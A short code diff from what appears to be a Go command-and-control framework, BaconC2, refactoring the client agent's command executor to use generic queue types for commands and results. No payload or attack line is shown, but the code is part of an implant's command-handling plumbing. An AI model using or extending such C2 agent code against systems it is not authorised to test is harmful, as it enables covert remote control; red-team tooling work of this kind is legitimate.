@@ -9,19 +9,20 @@ import (
 
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/commands"
-	"github.com/RabbITCybErSeC/BaconC2/client/models"
-	"github.com/RabbITCybErSeC/BaconC2/client/queue"
+	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
 
 type DefaultCommandExecutor struct {
-	queue           queue.ICommandQueue
-	resultsQueue    queue.IResultQueue
-	transport       models.ITransportProtocol
+	queue           queue.GenericQueue[models.Command]
+	resultsQueue    queue.GenericQueue[models.CommandResult]
+	transport       local_models.ITransportProtocol
 	config          *config.AgentConfig
 	commandRegistry *commands.CommandHandlerRegistry
 }
 
-func NewDefaultCommandExecutor(queue queue.ICommandQueue, resultsQueue queue.IResultQueue, transport models.ITransportProtocol, streamingTransport models.IStreamingTransport, cfg *config.AgentConfig) models.ICommandExecutor {
+func NewDefaultCommandExecutor(queue queue.GenericQueue[models.Command], resultsQueue queue.GenericQueue[models.CommandResult], transport local_models.ITransportProtocol, streamingTransport local_models.IStreamingTransport, cfg *config.AgentConfig) models.ICommandExecutor {
 	registry := commands.NewCommandHandlerRegistry()
 	commands.RegisterBuiltInCommands(registry, resultsQueue, transport, streamingTransport)
 	return &DefaultCommandExecutor{
